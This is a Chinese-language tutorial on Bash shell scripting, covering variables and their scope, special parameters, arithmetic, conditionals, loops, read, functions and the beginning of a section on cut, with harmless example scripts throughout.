<h1 id="shell中的变量">4. shell中的变量</h1>
<h2 id="系统变量">4.1. 系统变量</h2>
<p>常用的系统变量：</p>
<ol type="1">
<li>$HOME -&gt; 当前用户家目录</li>
<li>$PWD -&gt; 当前所在路径</li>
<li>$SHELL -&gt; 当前用户的默认shell</li>
<li>$USER -&gt; 当前用户</li>
<li>$PATH -&gt; 环境变量</li>
<li>...</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527082346.png" /></p>
<h2 id="自定义变量">4.2. 自定义变量</h2>
<h3 id="基本语法">4.2.1. 基本语法</h3>
<ol type="1">
<li>定义变量（如果已存在变量，那么就会重新赋值）：<code>变量=值</code>，注意不能有空格！shell中空格一般表示分隔</li>
<li>撤销变量：<code>unset 变量</code></li>
<li>声明静态变量：<code>readonly 变量</code>，此时该变量不能
unset，只能重启之后自动撤销</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527082754.png" /></p>
<p>如果需要输入的字符串是<strong>连续的</strong>，可以不见引号，如下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527082923.png" /></p>
<h3 id="变量定义规则">4.2.2. 变量定义规则</h3>
<ol type="1">
<li><p>变量名称可以由字母、数字和下划线组成，但是不能以数字开头，<strong>系统变量名建议大写</strong></p></li>
<li><p><strong>等号两侧不能有空格</strong></p></li>
<li><p>在 bash 中，变量默认类型都是字符串类型，无法直接进行数值运算</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527083239.png" /></p></li>
<li><p>变量的值如果有空格，需要使用双引号或单引号括起来</p></li>
</ol>
<h3 id="提升为全局环境变量">4.2.3. 提升为全局环境变量</h3>
<p>基本语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export 变量</span><br></pre></td></tr></table></figure></p>
<p>举个例子：</p>
<p>新建一个变量 <code>s=hello</code>，将其加入到 helloworld.sh 中</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527083852.png" /></p>
<p>然后，执行该脚本，会发现 s 变量并没有被输出</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527083930.png" /></p>
<p>但是如果将 s 提升为全局变量，则可以被输出</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527084002.png" /></p>
<h2 id="特殊变量">4.3. 特殊变量</h2>
<h3 id="n">4.3.1. <code>$n</code></h3>
<p>作用：<code>$n</code>，n为数字，<code>$0</code>代表该脚本名称，<code>$1</code>-<code>$9</code>代表第一到第九个参数，十以上的参数需要用大括号包含，如<code>$&#123;11&#125;</code></p>
<p>举个例子：</p>
<p>编写脚本 parameter.sh ，代码如下： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo &quot;$0 $1 $2 $3&quot;</span><br></pre></td></tr></table></figure></p>
<p>分别执行以下命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. bash parameter.sh</span><br><span class="line">2. bash parameter.sh I</span><br><span class="line">3. bash parameter.sh I Love</span><br><span class="line">4. bash parameter.sh I Love Myself</span><br><span class="line">5. bash parameter.sh I Love Myself too</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527084811.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527084831.png" /></p>
<p>可以看到，每往脚本名后面添加一个参数，就会被执行而显示出来。这其实类似于python中的
<code>sys.argv</code>，<code>sys.argv[0]</code>
表示的也是该文件本身，参数从 <code>sys.argv[1]</code> 开始。</p>
<h3 id="section">4.3.2. <code>$#</code></h3>
<p>作用：获取输入参数的个数，常用于循环</p>
<p>举个例子：</p>
<p>还是 parameter.sh ，添加一行代码： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo &quot;$0 $1 $2 $3&quot;</span><br><span class="line">echo $#</span><br></pre></td></tr></table></figure></p>
<p>分别执行以下命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. bash parameter.sh</span><br><span class="line">2. bash parameter.sh I</span><br><span class="line">3. bash parameter.sh I Love</span><br><span class="line">4. bash parameter.sh I Love Myself</span><br><span class="line">5. bash parameter.sh I Love Myself too</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527085254.png" /></p>
<p>根据结果可以知道，该变量可以获取传入的参数，即使该参数没被使用！</p>
<h3 id="和">4.3.3. <code>$*</code> 和 <code>$@</code></h3>
<p>功能：</p>
<ul>
<li><code>$*</code>: 这个变量代表命令行中所有的参数， <code>$*</code>
把所有的参数看成一个整体</li>
<li><code>$@</code>: 这个变量也代表命令行中所有的参数，不过
<code>$@</code> 把每个参数区分对待</li>
</ul>
<p>举个例子：</p>
<p>修改 parameter.sh 为: <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo &quot;$0 $1 $2 $3&quot;</span><br><span class="line">echo $#</span><br><span class="line">echo $*</span><br><span class="line">echo $@</span><br></pre></td></tr></table></figure></p>
<p>执行命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash parameter.sh I Love Myself too</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527085808.png" /></p>
<p>具体的区别看：[[#和 的区别]]</p>
<h3 id="section-1">4.3.4. <code>$?</code></h3>
<p>功能：最后一次执行的命令的返回状态。如果这个变量的值为0，表示上一条命令被正确执行；如果这个变量的值为非0，证明上一条命令的执行不正确。</p>
<p>举个例子：</p>
<ul>
<li><p>先故意执行一条错误的命令：<code>cat fsdasf</code>，然后在
<code>echo $?</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527090121.png" /></p></li>
<li><p>执行正确的命令 <code>cat parameter.sh</code>，然后在
<code>echo $?</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527090204.png" /></p></li>
</ul>
<h2 id="shell变量的作用域">4.4. shell变量的作用域</h2>
<p>变量的作用域，就是变量的有效范围。</p>
<p>shell变量的作用域分为三种：</p>
<ol type="1">
<li>只能在函数内部使用，叫做局部变量（local variable）</li>
<li>可以在当前shell进程中使用，叫做全局变量（global variable）</li>
<li>可以在子进程中使用，叫做环境变量（environment variable）</li>
</ol>
<h3 id="局部变量">4.4.1. 局部变量</h3>
<p>如下shell脚本： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">function func()&#123;</span><br><span class="line">	a=99 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func</span><br><span class="line">echo $a</span><br></pre></td></tr></table></figure></p>
<p>直接运行该函数</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527153821.png" /></p>
<p>可以看到 a 的值在函数外面被调用，因此 a 就是全局变量。可以在前面加上
local 使其成为局部变量。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">function func()&#123;</span><br><span class="line">	local a=99 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func</span><br><span class="line">echo $a</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527153946.png" /></p>
<p>此时，就无法在外面调用 a 变量。</p>
<h3 id="全局变量">4.4.2. 全局变量</h3>
<p>全局变量就是变量在当前的shell进程中都有效，每个shell进程都有自己的作用域，彼此互补干涉。在shell中定义的变量，默认都是全局变量。</p>
<p>需要强调的是，全局变量的作用范围是<strong>当前的 Shell
进程</strong>，而<strong>不是当前的 Shell
脚本文件</strong>，它们是不同的概念；打开一个 Shell 窗口就创建了一个
Shell 进程，打开多个 Shell 窗口就创建了多个 Shell 进程，每个 Shell
进程都是独立的，拥有不同的进程 ID；在一个 Shell 进程中可以使用
<code>source</code> 命令执行多个 Shell
脚本文件，此时<strong>全局变量在这些脚本文件中都有效</strong>:</p>
<blockquote>
<p>source命令：从当前shell会话中的文件读取和执行命令。source命令通常用于保留、更改当前shell中的环境变量。简而言之，source一个脚本，将会在当前shell中运行execute命令。
基本语法：<code>source filename</code>，可以使用 <code>.</code> 来代替
<code>source</code></p>
</blockquote>
<p>首先创建两个文件 a.sh, b.sh，代码分别如下： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo $a</span><br><span class="line">b=100</span><br></pre></td></tr></table></figure></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo $b</span><br></pre></td></tr></table></figure>
<p>然后在当前shell窗口输入：<code>a=10</code>，最后依次执行下面的命令：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source a.sh</span><br><span class="line">. ./b.sh</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527155033.png" /></p>
<p>这三条命令都是在一个进程中执行的，从输出结果可以发现，在 Shell
窗口中以命令行的形式定义的变量 a，在 a.sh 中有效；在 a.sh 中定义的变量
b，在 b.sh 中也有效，变量 b 的作用范围已经超越了 a.sh。</p>
<p>注意，必须在当前进程中运行 Shell 脚本，不能在新进程中运行 Shell
脚本。</p>
<h3 id="环境变量">4.4.3. 环境变量</h3>
<p>全局变量只在当前 Shell 进程中有效，对其它 Shell
进程和子进程都无效。如果使用<code>export</code>命令将全局变量导出，那么它就在所有的子进程中也有效了，这称为“环境变量”。</p>
<p>环境变量被创建时所处的 Shell
进程称为父进程，如果在父进程中再创建一个新的进程来执行 Shell
命令，那么这个新的进程被称作 Shell 子进程。当 Shell
子进程产生时，它会继承父进程的环境变量为自己所用，所以说环境变量可从父进程传给子进程。不难理解，环境变量还可以传递给孙进程。</p>
<p>注意，两个没有父子关系的 Shell
进程是不能传递环境变量的，并且环境变量只能向下传递而不能向上传递，即“传子不传父”。</p>
<p>在当前窗口创建一个变量 <code>via=hello</code>，然后输入
<code>bash</code> 新建一个进程，输出 via <code>echo $via</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527155426.png" /></p>
<p>从结果可以看出来，该shell进程下并没有该变量。</p>
<p>使用 <code>exit</code>
退出该shell进程，回到刚刚创建via的进程，然后输入
<code>export via</code>，将其升级为环境变量，接着再次
<code>bash</code>，创建新进程，最后<code>echo $via</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527155742.png" /></p>
<p>如果想在定义变量的同时将其导出为环境变量，可以使用
<code>export a=12</code> 这样的命令。</p>
<p><strong>注意，这样得到的环境变量也是临时的，如果最顶层的父进程，也就是创建改变量的进程关闭了，那么该环境变量也就消失了</strong></p>
<p>比如，我关闭当前窗口，开启一个新窗口，再次输出该变量</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527160005.png" /></p>
<h1 id="运算符">5. 运算符</h1>
<p>基本语法：</p>
<ol type="1">
<li><code>$((运算式))</code> 或者 <code>$[运算式]</code></li>
<li><code>expr +, -, \*, /, %</code>，分别是加，减，乘，除，取余</li>
</ol>
<blockquote>
<p>注意：使用 expr 的时候运算符与参数之间需要有空格</p>
</blockquote>
<p>举个例子：</p>
<ol type="1">
<li><p>计算 3+2 的值</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. expr 2 + 3 # 对</span><br><span class="line">2. expr 2+3   # 错</span><br><span class="line">3. expr 2+ 3  # 错</span><br><span class="line">4. expr 2 +3  # 错</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527090844.png" /></p></li>
<li><p>计算 (2+3) * 4 的值</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. expr `expr 2 + 3` \* 4</span><br><span class="line">2. s=$[(2+3)*4];echo $s</span><br></pre></td></tr></table></figure>
<p>两种方式都是可行的。第一种的反引号[[Linux的shell中单、双、反引号的区别]]</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527091031.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527091059.png" /></p></li>
</ol>
<h1 id="条件判断">6. 条件判断</h1>
<h2 id="基本语法-1">6.1. 基本语法</h2>
<ul>
<li><code>[ condition ]</code></li>
</ul>
<p>注意： - condition 前后都要有空格 - 条件非空即为 true，比如
<code>[ hello ]</code> 返回 true，<code>[  ]</code> 返回false</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527092130.png" /></p>
<h2 id="常用判断条件">6.2. 常用判断条件</h2>
<ol type="1">
<li><p>两个<strong>整数</strong>之间比较 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. = 也可用于字符串比较</span><br><span class="line">2. -lt 小于（less than）</span><br><span class="line">3. -le 小于等于（less equal）</span><br><span class="line">4. -eq 等于（equal）</span><br><span class="line">5. -gt 大于（greater than）</span><br><span class="line">6. -ge 大于等于（greater equal）</span><br><span class="line">7. -ne 不等于（not equal）</span><br></pre></td></tr></table></figure></p></li>
<li><p>按照文件权限进行判断 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. -r 是否有读权限</span><br><span class="line">2. -w 是否有写权限</span><br><span class="line">3. -x 是否有执行权限</span><br></pre></td></tr></table></figure></p></li>
<li><p>按照文件类型进行判断 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. -f 文件存在，且是一个常规的文件(file)</span><br><span class="line">2. -e 文件存在</span><br><span class="line">3. -d 文件存在，并且是一个目录(directory)</span><br></pre></td></tr></table></figure></p></li>
</ol>
<p>举个例子：</p>
<ol type="1">
<li><p>判断 23 是否大于 22</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ 23 -ge 22 ]; echo $?</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527093007.png" /></p></li>
<li><p>helloworld.sh 是否具有写权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ -w helloworld.sh ]; echo $?</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527093109.png" /></p></li>
<li><p>判断 /hoem/m1ku/shell.sh 是否存在</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ -e /hoem/m1ku/shell.sh ];echo $?</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527093219.png" /></p></li>
<li><p>多条件判断（<code>&amp;&amp;</code>前一条命令执行成功，才会执行下一条；<code>||</code>前一条命令执行失败，才会执行下一条，因为前一条成功的话，两条命令的或已经1）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ hello ] &amp;&amp; echo OK || echo NotOK</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527093503.png" /></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ hello ] &amp;&amp; [  ] || echo NotOK</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527093600.png" /></p></li>
</ol>
<h1 id="流程控制">7. 流程控制</h1>
<h2 id="if判断">7.1. if判断</h2>
<p>基本语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ condition ];then</span><br><span class="line">	程序</span><br><span class="line">elif [ conditon ];then</span><br><span class="line">	程序</span><br><span class="line">else</span><br><span class="line">	程序</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">if [ condition ]</span><br><span class="line">then</span><br><span class="line">	 程序</span><br><span class="line">elif [ conditon2 ]</span><br><span class="line">then</span><br><span class="line">	程序</span><br><span class="line">else</span><br><span class="line">	程序</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>注意：</p>
<ul>
<li><code>[ condition ]</code>，condition 前后要有空格</li>
<li>if 和 elif 后面都必须有空格</li>
</ul>
<p>举个例子：</p>
<p>需求：输入一个数字，如果是1，则输出 hello world，如果是2，则输出 No
no no；如果是其他，则什么都不输出。</p>
<p>编写脚本 if.sh <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [ $1 -eq 1 ]</span><br><span class="line">then</span><br><span class="line">	echo &quot;hello world&quot;</span><br><span class="line">elif [ $1 -eq 2 ]</span><br><span class="line">then</span><br><span class="line">	echo &quot;No no no&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>也可以这么写： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [ $1 -eq 1 ];then</span><br><span class="line">        echo &quot;hello world&quot;</span><br><span class="line">elif [ $1 -eq 2 ];then</span><br><span class="line">        echo &quot;No no no&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527094628.png" /></p>
<h2 id="case语句">7.2. case语句</h2>
<p>基本语法: <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">case $变量名 in</span><br><span class="line">&quot;value_1&quot;)</span><br><span class="line">	如果变量值为 value_1，则执行程序1</span><br><span class="line">	;;</span><br><span class="line">&quot;value_2&quot;)</span><br><span class="line">	如果变量值为 value_2，则执行程序2</span><br><span class="line">	;;</span><br><span class="line">&quot;value_3&quot;)</span><br><span class="line">	如果变量值为 value_3，则执行程序3</span><br><span class="line">	;;</span><br><span class="line">*)</span><br><span class="line">	如果变量的值都不是以上的值，则执行此程序</span><br><span class="line">	;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure></p>
<p>注意：<code>"value_1"</code>
的引号可以不写，只有当变量的值含有空格时，需要带上引号</p>
<p>举个例子：</p>
<p>需求：输入一个数字，如果是1，则输出hello world；如果是2，则输出
cls；都不是，则输出 No no no。</p>
<p>编写脚本 case.sh <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">case $1 in</span><br><span class="line">1)</span><br><span class="line">    echo &quot;hello world&quot;</span><br><span class="line">    ;;</span><br><span class="line">2)</span><br><span class="line">    echo &quot;cls&quot;</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    echo &quot;No no no&quot;</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure></p>
<p>执行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527095640.png" /></p>
<h2 id="for循环">7.3. for循环</h2>
<h3 id="基础语法1">7.3.1. 基础语法1</h3>
<p>基本语法1： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for((初始值;循环控制条件;变量变化))</span><br><span class="line">do</span><br><span class="line">	程序</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>举个例子：</p>
<p>需求：从1加到100</p>
<p>编写脚本 for.sh <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">s=0</span><br><span class="line">for((i=1;i&lt;=100;i++))</span><br><span class="line">do</span><br><span class="line">    s=$[$s+$i]</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo $s</span><br></pre></td></tr></table></figure></p>
<p>执行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527100419.png" /></p>
<h3 id="基础语法2">7.3.2. 基础语法2</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for 变量 in value1 value2 value3 ...</span><br><span class="line">do</span><br><span class="line">	程序</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>解释：依次将 value1, value2, value3 赋值给变量，然后执行程序</p>
<p>举个例子：</p>
<p>需求：打印所有输入的参数</p>
<p>编写脚本 for2.sh <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">for i in $*</span><br><span class="line">do</span><br><span class="line">    echo &quot;I love $i&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>执行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527100857.png" /></p>
<h4 id="和的区别">7.3.2.1. <code>$*</code>和<code>$@</code>的区别</h4>
<p>^436457</p>
<p>编写脚本 test.sh <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo &#x27;$* case:&#x27;</span><br><span class="line">for i in $*</span><br><span class="line">do</span><br><span class="line">    echo &quot;I love $i&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &#x27;$@ case:&#x27;</span><br><span class="line">for j in $@</span><br><span class="line">do</span><br><span class="line">    echo &quot;You love $j&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>运行结果</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527101204.png" /></p>
<p>看结果好像没有区别。我们加上引号再执行依次： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo &#x27;$* case:&#x27;</span><br><span class="line">for i in &quot;$*&quot;</span><br><span class="line">do</span><br><span class="line">    echo &quot;I love $i&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &#x27;$@ case:&#x27;</span><br><span class="line">for j in &quot;$@&quot;</span><br><span class="line">do</span><br><span class="line">    echo &quot;You love $j&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527101317.png" /></p>
<p>这就是：“把输入的参数当作一个整体”和“把输入的参数区分开来”的区别</p>
<h2 id="while循环">7.4. while循环</h2>
<p>基本语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">while [ conddition ]</span><br><span class="line">do</span><br><span class="line">	程序</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>注意：</p>
<ul>
<li>while 后面需要有空格</li>
<li><code>[ condition ]</code> conditon前后都要有空格</li>
</ul>
<p>举个例子：</p>
<p>需求：从1加到100</p>
<p>编写脚本 while.sh <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">i=1</span><br><span class="line">s=0</span><br><span class="line">while [ $i -le 100 ]</span><br><span class="line">do</span><br><span class="line">    s=$[$s+$i]</span><br><span class="line">    i=$[$i+1]</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo $s</span><br></pre></td></tr></table></figure></p>
<p>执行结果为：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527102232.png" /></p>
<h1 id="read读取控制台输入">8. read读取控制台输入</h1>
<p>基础语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">read (选项) (参数)</span><br></pre></td></tr></table></figure></p>
<p>选项：</p>
<ul>
<li>-t: 指定读取时等待的时间（单位：秒）</li>
<li>-p：指定读取时的提示符</li>
</ul>
<p>参数：</p>
<ul>
<li>变量：指定读取的变量名</li>
</ul>
<p>举个例子：</p>
<p>需求：提示7秒内，读取控制台输入的名称</p>
<p>编写脚本 read.sh <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">read -t 7 -p &quot;input your name in 7 seconds: &quot; name</span><br><span class="line">echo $name</span><br></pre></td></tr></table></figure></p>
<p>运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527102822.png" /></p>
<p>可以一次性输入多个参数，参数之间用空格隔开，比如： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">read -t 10 -p &quot;input your name in 10 seconds: &quot; name age</span><br><span class="line">echo $name</span><br><span class="line">echo $age</span><br></pre></td></tr></table></figure></p>
<p>运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527103046.png" /></p>
<h1 id="函数">9. 函数</h1>
<h2 id="系统函数">9.1. 系统函数</h2>
<h3 id="basename">9.1.1. basename</h3>
<p>基础语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">basename [path] [suffix]</span><br></pre></td></tr></table></figure></p>
<p>功能：</p>
<ul>
<li>basename命令会删掉path中的所有前缀，只留下文件名</li>
<li>suffix如果被指定，basename会从path中把suffix指定的后缀去掉</li>
</ul>
<p>例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">basename /home/m1ku/shellLearn/helloworld.sh</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527111032.png" /></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">basename /home/m1ku/shellLearn/helloworld.sh .sh</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527111132.png" /></p>
<h3 id="dirname">9.1.2. dirname</h3>
<p>基础语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirname 绝对路径</span><br></pre></td></tr></table></figure></p>
<p>功能：将给定文件的绝对路径中的文件名部分去掉，返回路径</p>
<p>举个例子： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirname /home/m1ku/shellLearh/helloworld.sh</span><br></pre></td></tr></table></figure></p>
<p>运行结果</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527111316.png" /></p>
<h2 id="自定义函数">9.2. 自定义函数</h2>
<p>基本语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function funcname()  # function 可加可不加</span><br><span class="line">&#123;</span><br><span class="line">	代码</span><br><span class="line">	[return int]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意：</p>
<ul>
<li>必须再调用函数之前声明函数，shell脚本是逐行运行的，不会提前进行编译；</li>
<li>函数返回值，只能够通过 <code>$?</code> 来获取。可以使用 return
进行返回；如果不加，将以最后一条命令的运行结果作为返回值。return
后跟的数值 n(0-255)</li>
</ul>
<p>举个例子：</p>
<p>需求：计算两个输入参数的和</p>
<p>编写脚本 sum.sh <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">function sum()</span><br><span class="line">&#123;</span><br><span class="line">    s=0</span><br><span class="line">    s=$[$1+$2]</span><br><span class="line">    echo $s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">read -t 10 -p &quot;input the first and second parameters separately: &quot; p1 p2</span><br><span class="line">sum $p1 $p2</span><br></pre></td></tr></table></figure></p>
<p>运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527113022.png" /></p>
<p>如果给函数增加返回值： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">function sum()</span><br><span class="line">&#123;</span><br><span class="line">    s=0</span><br><span class="line">    s=$[$1+$2]</span><br><span class="line">    echo $s</span><br><span class="line">    return 250</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">read -t 10 -p &quot;input the first and second parameters separately: &quot; p1 p2</span><br><span class="line">sum $p1 $p2</span><br><span class="line">echo $?</span><br></pre></td></tr></table></figure></p>
<p>运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527113239.png" /></p>
<h1 id="shell工具">10. shell工具</h1>
<h2 id="cut">10.1. cut</h2>
<p>cut 的工作就是“剪”。具体的说就是在文件中负责剪切数据用的。cut
命令从文件的每一行剪切字节、字符和字段，并将这些字节、字符和字段输出。</p>
<p>基础语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cut [选项] file</span><br></pre></td></tr></table></figure></p>
<p>选项：</p>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-b</td>
<td>以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了-n</td>
</tr>
<tr class="even">
<td>-c</td>
<td>以字符为单位进行分割</td>
</tr>
<tr class="odd">
<td>-d</td>
<td>自定义分隔符，默认为制表符</td>
</tr>
<tr class="even">
<td>-f</td>
<td>与-d一起使用，指定显示哪一个区域</td>
